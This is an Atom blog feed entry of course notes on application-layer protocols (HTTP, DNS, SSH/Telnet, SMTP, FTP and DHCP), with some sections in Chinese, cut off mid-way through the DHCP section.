<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title> • Posts by &#34;http&#34; tag</title>
    <link href="http://example.com" />
    <updated>2024-11-04T03:27:37.000Z</updated>
    <category term="network system" />
    <category term="C" />
    <category term="software security" />
    <category term="AFL" />
    <category term="Linux" />
    <category term="C language" />
    <category term="vulnerability" />
    <category term="HTTP" />
    <category term="XSS" />
    <category term="CSRF" />
    <category term="WAN" />
    <category term="IPv6" />
    <category term="IP" />
    <category term="DHCP" />
    <category term="ICMP" />
    <category term="ARP" />
    <category term="router" />
    <category term="Supernet" />
    <category term="IPv4" />
    <category term="Subnet" />
    <category term="TCP" />
    <category term="UDP" />
    <category term="DNS" />
    <category term="SSH" />
    <category term="FTP" />
    <category term="SMTP" />
    <category term="OSI" />
    <category term="TCP/IP" />
    <category term="Network Security" />
    <category term="SQL" />
    <category term="Wi-Fi" />
    <category term="WLANs" />
    <category term="gdb" />
    <category term="Blog" />
    <category term="日常" />
    <category term="JavaScript" />
    <entry>
        <id>http://example.com/course/Layer-7-Application-layer-Protocols-and-Services/</id>
        <title>Layer 7 - Application-layer Protocols and Services</title>
        <link rel="alternate" href="http://example.com/course/Layer-7-Application-layer-Protocols-and-Services/"/>
        <content type="html">&lt;h1 id=&#34;Hypertext Transfer Protocol (HTTP)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Hypertext Transfer Protocol (HTTP)&#34;&gt;#&lt;/a&gt;Hypertext Transfer Protocol (HTTP)&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;World Wide Web (WWW)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;The most popular service on the Internet&lt;/li&gt;
&lt;li&gt;Immense collection of Web pages and other resources that can be downloaded across the Internet and displayed on a workstation via a web browser&lt;/li&gt;
&lt;li&gt;The main concept is  &lt;code&gt;hypertext&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;A system that allows related documents to be linked together
&lt;ul&gt;
&lt;li&gt;A “web” of electronically-linked documents&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Major functional components of the WWW
&lt;ul&gt;
&lt;li&gt;HyperText Markup Language (HTML)&lt;/li&gt;
&lt;li&gt;Hypertext Transfer Protocol (HTTP)&lt;/li&gt;
&lt;li&gt;Uniform Resource Identifiers (URIs)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;HTTP&lt;br&gt;
Originally, its main purpose was to transfer static web pages written in HTML&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Now, it is also used for general file transfer and downloading/displaying multimedia files&lt;/li&gt;
&lt;li&gt;Default TCP port number is 80&lt;/li&gt;
&lt;li&gt;HTTP is an application-layer protocol
&lt;ul&gt;
&lt;li&gt;HTTP/2 is based on TCP as its Transport-layer protocol&lt;/li&gt;
&lt;li&gt;HTTP/3 is based on QUIC as its Transport-layer protocol (RFC 9114, released on 6 June 2022)
&lt;ul&gt;
&lt;li&gt;QUIC (RFC 9000, released in May 2021)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Functions as a request-response protocol in the client-server computing model&lt;/li&gt;
&lt;li&gt;Identify and locate network resources by Uniform Resource Identifiers (URIs)&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;HTTP Encapsulation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Example of how the layers work together:
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;start your Web browser and your home page is &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==&#34;&gt;http://www.example.com&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The web browser formats a request for your home page by using the Application layer protocol HTTP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The request looks something like:  &lt;code&gt;get the example.com home page&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The unit of information the Application layer works with is simply called  &lt;code&gt;data&lt;/code&gt; &lt;br&gt;
The Application-layer protocol HTTP passes the request down to the Transport-layer protocol (TCP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TCP adds a header to the request&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The unit of information the Transport layer works with is called a  &lt;code&gt;segment&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TCP passes the segment to the Internetwork layer protocol (IP)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IP places its header on the segment&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The unit of information is now called a  &lt;code&gt;packet&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The packet is passed down to the Network access layer, where the NIC operates&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A  &lt;code&gt;frame&lt;/code&gt;  header and trailer are added&lt;br&gt;
&lt;img data-src=&#34;https://cdn-fusion.imgcdn.store/i/2024/6b810b6747c82aec.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The frame is delivered to the network medium as bits&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;on its way to the &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==&#34;&gt;www.example.com&lt;/span&gt; server&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;13&#34;&gt;
&lt;li&gt;The web server processes it and returns a Web page&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Uniform Resource Identifiers (URIs)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A method of defining labels that the users of the Web could locate hypertext documents so they could be located and referenced&lt;/li&gt;
&lt;li&gt;Not specific to the Web, though they are most often associated with the Web and HTTP&lt;/li&gt;
&lt;li&gt;Uniform Resource Locators (URLs) are a subset of URIs&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Locating a Document on the Internet&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Every document on the Internet has a unique Uniform Resource Locator (URL)&lt;/li&gt;
&lt;li&gt;All URLs consist of four parts:
&lt;ul&gt;
&lt;li&gt;Service type, e.g., http://&lt;/li&gt;
&lt;li&gt;Host or domain name, e.g., &lt;a href=&#34;http://example.com&#34;&gt;example.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Directory or subdirectory information&lt;/li&gt;
&lt;li&gt;Filename&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;Web Client/Server&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Web client
&lt;ul&gt;
&lt;li&gt;To communicate with a web server, using Hypertext Transfer Protocol (HTTP)
&lt;ul&gt;
&lt;li&gt;Firefox, Edge, Chrome&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To submit an HTTP request to the server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web server
&lt;ul&gt;
&lt;li&gt;To provide web content that can be accessed through the Internet
&lt;ul&gt;
&lt;li&gt;Microsoft’s Internet Information Services (IIS)&lt;/li&gt;
&lt;li&gt;Apache&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To provide response message to the client&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Domain Name System (DNS)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Domain Name System (DNS)&#34;&gt;#&lt;/a&gt;Domain Name System (DNS)&lt;/h1&gt;
&lt;h2 id=&#34;DNS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#DNS&#34;&gt;#&lt;/a&gt;DNS&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Domain Names&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Domain
&lt;ul&gt;
&lt;li&gt;Group of computers belonging to same organization&lt;/li&gt;
&lt;li&gt;Share common part of IP address&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Domain name
&lt;ul&gt;
&lt;li&gt;Identifies domain (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvYy5nb3Y=&#34;&gt;loc.gov&lt;/span&gt;)&lt;/li&gt;
&lt;li&gt;Associated with company, university, government organization&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully qualified host name (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2dzLmxvYy5nb3Y=&#34;&gt;blogs.loc.gov&lt;/span&gt;)
&lt;ul&gt;
&lt;li&gt;Local host name plus domain name&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Domain Name System (DNS)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Commonly used analogy a “phone book” for the Internet&lt;/li&gt;
&lt;li&gt;To keep the system manageable, the DNS is a hierarchical distributed naming service for computers/services/resources connected to the Internet&lt;/li&gt;
&lt;li&gt;Translate human-friendly computer hostnames into IP addresses to locate computer resources
&lt;ul&gt;
&lt;li&gt;Computers do not use domain names, but binary addressing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;DNS Database Structure&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#DNS Database Structure&#34;&gt;#&lt;/a&gt;DNS Database Structure&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;DNS Database Structure&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Can be best understood as a tree structure
&lt;ul&gt;
&lt;li&gt;In the domain namespace, all domains meet at the root, identified by a single period (.)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Second-level domain (SLD) are usually the name of a company or institution&lt;/li&gt;
&lt;li&gt;Subdomain is optional&lt;/li&gt;
&lt;li&gt;Host level represents individual device&lt;/li&gt;
&lt;li&gt;Some Well-known Top-level Domains&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Domain suffix&lt;/th&gt;
&lt;th&gt;Type of organization&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ARPA&lt;/td&gt;
&lt;td&gt;Reverse lookup domain (special Internet function)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;COM&lt;/td&gt;
&lt;td&gt;Commercial&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EDU&lt;/td&gt;
&lt;td&gt;Educational&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GOV&lt;/td&gt;
&lt;td&gt;Government&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ORG&lt;/td&gt;
&lt;td&gt;Noncommercial organization (such as a nonprofit agency)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NET&lt;/td&gt;
&lt;td&gt;Network (such as an ISP)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;INT&lt;/td&gt;
&lt;td&gt;International Treaty Organization&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MIL&lt;/td&gt;
&lt;td&gt;United States military organization&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;BIZ&lt;/td&gt;
&lt;td&gt;Businesses&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;INFO&lt;/td&gt;
&lt;td&gt;Unrestricted use&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AERO&lt;/td&gt;
&lt;td&gt;Air-transport industry&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;COOP&lt;/td&gt;
&lt;td&gt;Cooperatives&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Root Servers&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Root servers are the authoritative name servers that serve the DNS root zone&lt;/li&gt;
&lt;li&gt;Root servers are a network of hundreds of servers for redundancy in many countries around the world.&lt;/li&gt;
&lt;li&gt;They are specified in the DNS root zone as 13 logical named authorities.
&lt;ul&gt;
&lt;li&gt;This does not mean that there are only 13 physical servers; each operator uses redundant computer equipment to provide reliable&lt;br&gt;
service&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;DNS Client (Resolver)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;DNS clients in most operating systems maintain a DNS cache, called a resolver cache
&lt;ul&gt;
&lt;li&gt;Stores name and IP address pairs and other data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The DNS client is responsible for communicating with a DNS server to resolve computer and domain names to IP addresses&lt;/li&gt;
&lt;li&gt;An OS must be configured to use DNS and needs at least one address of a DNS server that it can query&lt;/li&gt;
&lt;li&gt;In Windows, the first DNS server configured is called the preferred DNS server and the second one is the alternate DNS server&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;DNS server&lt;br&gt;
DNS servers are composed of the following:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;DNS zones – a database of primarily hostname and IP address pairs&lt;/li&gt;
&lt;li&gt;Resource records – the data contained in a zone&lt;/li&gt;
&lt;li&gt;Cache – results of queries are cached so that if the same query occurs again, the local DNS server can respond without having to contact another server&lt;/li&gt;
&lt;li&gt;Root hints – file containing a list of all IP addresses of Internet root servers&lt;/li&gt;
&lt;li&gt;DNS Server service – runs in the background and listens for DNS queries on UDP port 53&lt;/li&gt;
&lt;li&gt;DNS Query Making its Way Through the DNS Hierarchy&lt;br&gt;
&lt;img data-src=&#34;https://cdn-fusion.imgcdn.store/i/2024/95ccdad58249c863.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;DNS Database Records&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#DNS Database Records&#34;&gt;#&lt;/a&gt;DNS Database Records&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Resource records (RR)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Stores data associated with domain names, address records, and other specific data&lt;/li&gt;
&lt;li&gt;Divided into four classes, of which Internet class is of most interest to the users&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Most Commonly Used Record Types
&lt;ol&gt;
&lt;li&gt;Start of Authority (SOA) record&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Identifies the name server that is authoritative for a specific DNS database segment;&lt;/li&gt;
&lt;li&gt;Identifies the master DNS server for a specific domain or sub-domain&lt;/li&gt;
&lt;li&gt;First entry in the DNS file - both  &lt;code&gt;domain.dns&lt;/code&gt;  and  &lt;code&gt;addr.in-addr.arpa.dns&lt;/code&gt;  files - must be an SOA record&lt;/li&gt;
&lt;li&gt;Identifies the current name server as the best source of information for data in its zone&lt;/li&gt;
&lt;li&gt;Both secondary and primary name servers can
&lt;ul&gt;
&lt;li&gt;Designate themselves as authoritative in their own SOA records&lt;/li&gt;
&lt;li&gt;This allows load-balancing across a primary and one or more secondary DNS servers in a domain&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Name Server (NS) record&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Used to identify all DNS servers in a domain&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Address (A) record&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Stores domain name-to-IP address translation data&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Canonical name (CNAME) record&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Used to create aliases&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Mail Exchange (MX) record&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Used to route SMTP-based e-mail on the Internet and identify the IP address for a domain’s master e-mail server&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;Pointer (PTR) record&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Stores IP address-to-domain name translation data and supports the operation known as a reverse DNS lookup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mapping Addresses to Names&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Records in the  &lt;code&gt;db.addr&lt;/code&gt;  file are provided to support reverse DNS lookups&lt;/li&gt;
&lt;li&gt;Reverse address lookups are used primarily to determine if IP address that a user presents matches the domain name from which the user claims to originate&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Resolving process
&lt;ol&gt;
&lt;li&gt;The DNS query is sent by the resolver to the local DNS server for resolution&lt;/li&gt;
&lt;li&gt;If local DNS server does not recognise the address, then it queries the root server&lt;/li&gt;
&lt;li&gt;If root server doesn’t recognize the domain name, the root will provide relevant information to the the resolver to contact the name server, which is the next level down&lt;/li&gt;
&lt;li&gt;Repetition of the step to process each domain name in a top-down manner until the query is resolved, then
&lt;ul&gt;
&lt;li&gt;The resolver returns the resolved IP address to the requester&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;Remote Login (Telnet) and Secure Shell (SSH)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Remote Login (Telnet) and Secure Shell (SSH)&#34;&gt;#&lt;/a&gt;Remote Login (Telnet) and Secure Shell (SSH)&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Remote Login (Telnet and SSH)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A terminal emulation program for TCP/IP networks
&lt;ul&gt;
&lt;li&gt;Allows a user to remotely log in to a distant computer site&lt;/li&gt;
&lt;li&gt;User usually needs a login ID and password to access a remote computer site&lt;/li&gt;
&lt;li&gt;To provide access to a command-line interface on a remote host&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Telnet and SSH: network protocols for remote login
&lt;ul&gt;
&lt;li&gt;Telnet (Port 23) is not secure&lt;/li&gt;
&lt;li&gt;SSH (Port 22) provides an encrypted channel between the client and server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SSH Clients
&lt;ul&gt;
&lt;li&gt;PuTTY&lt;/li&gt;
&lt;li&gt;use SSH from Windows Command window and MacOS terminal window&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Remote Desktop Software&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Remote desktop software
&lt;ul&gt;
&lt;li&gt;Remote Desktop Protocol (RDP)
&lt;ul&gt;
&lt;li&gt;Uses Graphic User Interface (GUI) to manage/access Windows computers remotely&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Independent Computing Architecture (ICA)&lt;/li&gt;
&lt;li&gt;Virtual network computing (VNC)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Some remote desktop clients
&lt;ul&gt;
&lt;li&gt;Google’s Chrome Remote Desktop&lt;/li&gt;
&lt;li&gt;Microsoft Remote Desktop&lt;/li&gt;
&lt;li&gt;TeamViewer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Simple Mail Transfer Protocol (SMTP)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Simple Mail Transfer Protocol (SMTP)&#34;&gt;#&lt;/a&gt;Simple Mail Transfer Protocol (SMTP)&lt;/h1&gt;
&lt;h2 id=&#34;E-mail Protocol&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#E-mail Protocol&#34;&gt;#&lt;/a&gt;E-mail Protocol&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;E-mail Protocols&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Post Office Protocol version 3 (POP3) is used to download incoming messages from e-mail servers to local desktops (uses TCP port 110)&lt;/li&gt;
&lt;li&gt;Internet Message Access Protocol v.4 (IMAP4) used to manage email messages locally and yet stores email folders on a server (uses TCP port 143)&lt;/li&gt;
&lt;li&gt;Simple Mail Transfer Protocol (SMTP) is the standard protocol for sending email over the Internet (uses TCP port 25)&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;邮件系统的组成
&lt;ol&gt;
&lt;li&gt;Mail User Agent (MUA) - 邮件用户代理&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;功能：MUA 是电子邮件应用程序，用于创建、发送、接收、存储、回复和转发电子邮件。它还支持附件功能。&lt;/li&gt;
&lt;li&gt;示例：如 Outlook、Thunderbird 等。&lt;/li&gt;
&lt;li&gt;用途：通过 SMTP 协议发送邮件，通过 POP 或 IMAP 协议下载和接收邮件。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Message Transfer Agent (MTA) - 消息传输代理&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;功能：MTA 负责准备和传输电子邮件消息，确保邮件能够在不同服务器之间传输。&lt;/li&gt;
&lt;li&gt;用途：MTA 在不同的邮件服务器之间传递邮件。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Multipurpose Internet Mail Extension (MIME) - 多用途互联网邮件扩展&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;功能：MIME 用于将非文本格式的文件（如图像、音频、视频等）附加到电子邮件中，使得电子邮件可以包含多种格式的内容。&lt;/li&gt;
&lt;li&gt;用途：通过 MIME 标准，电子邮件不仅能传输文本，还能传输附件，如图片、PDF 等文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;邮件系统的工作流程
&lt;ul&gt;
&lt;li&gt;发送邮件：MUA 创建邮件并通过 SMTP 协议将其发送到 MTA；MTA 将邮件传递到收件人的 SMTP 服务器。&lt;/li&gt;
&lt;li&gt;接收邮件：收件人的 MUA 通过 POP 或 IMAP 协议从 SMTP 服务器下载邮件&lt;br&gt;
&lt;img data-src=&#34;https://cdn-fusion.imgcdn.store/i/2024/b496d50c4b936cc4.png&#34; alt=&#34;email&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;SMTP&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#SMTP&#34;&gt;#&lt;/a&gt;SMTP&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;SMTP Communications&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;SMTP commands and reply codes immediately follow the TCP header&lt;/li&gt;
&lt;li&gt;SMTP commands occur behind the scenes in some e-mail clients and some server-to-server mail transfers on the Internet&lt;/li&gt;
&lt;li&gt;The majority of e-mail clients today use SMTP to send outgoing mail through some nearby SMTP server which assumes the task of storing or forwarding such messages, depending on addressee’s domain&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;helo&lt;/td&gt;
&lt;td&gt;Used by the client to identify itself&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mail from&lt;/td&gt;
&lt;td&gt;Used by the client to identify the sender&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rcpt to&lt;/td&gt;
&lt;td&gt;Used by the client to identify the recipient&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;data&lt;/td&gt;
&lt;td&gt;Used to send the message&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;quit&lt;/td&gt;
&lt;td&gt;To terminate the message&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vrfy&lt;/td&gt;
&lt;td&gt;Used to verify the address of recipient&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn-fusion.imgcdn.store/i/2024/e4681fbfda7303a9.png&#34; alt=&#34;email&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;File Transfer Protocol (FTP)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#File Transfer Protocol (FTP)&#34;&gt;#&lt;/a&gt;File Transfer Protocol (FTP)&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;FTP&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;FTP is a client/server protocol used for file transfer across the Internet
&lt;ul&gt;
&lt;li&gt;Uses two channels: TCP ports 20 and 21
&lt;ul&gt;
&lt;li&gt;Port 21 for control commands, Port 20 for transferring data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Not a secure protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Uses URL for an FTP site begins with  &lt;code&gt;ftp://...&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The 3 most common ways to access an FTP site:
&lt;ul&gt;
&lt;li&gt;Through a browser&lt;/li&gt;
&lt;li&gt;Using an FTP client program&lt;/li&gt;
&lt;li&gt;Issuing FTP commands at a text-based command prompt&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;FTP connections&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;TCP-based Command Connection (control connection)
&lt;ul&gt;
&lt;li&gt;The command connection runs over TCP&lt;/li&gt;
&lt;li&gt;Created automatically when FTP connection is established in response to open command from FTP client, using server FTP port number 21&lt;/li&gt;
&lt;li&gt;The client uses a dynamic, or ephemeral, port number to handle the other end of a command connection&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TCP-based Data Transfer Connection (data connection)
&lt;ul&gt;
&lt;li&gt;The data transfer connection also runs over TCP&lt;/li&gt;
&lt;li&gt;Created by the server by default&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Dynamic Host Configuration Protocol (DHCP)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;Dynamic Host Configuration Protocol (DHCP)&#34;&gt;#&lt;/a&gt;Dynamic Host Configuration Protocol (DHCP)&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;DHCP&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;DHCP is used to automatically assign IP addresses as needed
&lt;ul&gt;
&lt;li&gt;When a computer is turned on, it requests an address from a server that is configured as a DHCP server&lt;/li&gt;
&lt;li&gt;The server assigns an address for a specific amount of time (called&lt;br&gt;
a lease)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DHCP Server service – runs in the background and listens on UDP port 67 for IP address requests&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;DHCP Server&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A DHCP server is composed of the following:
&lt;ul&gt;
&lt;li&gt;IP address scope – a range of IP addresses the server leases to clients
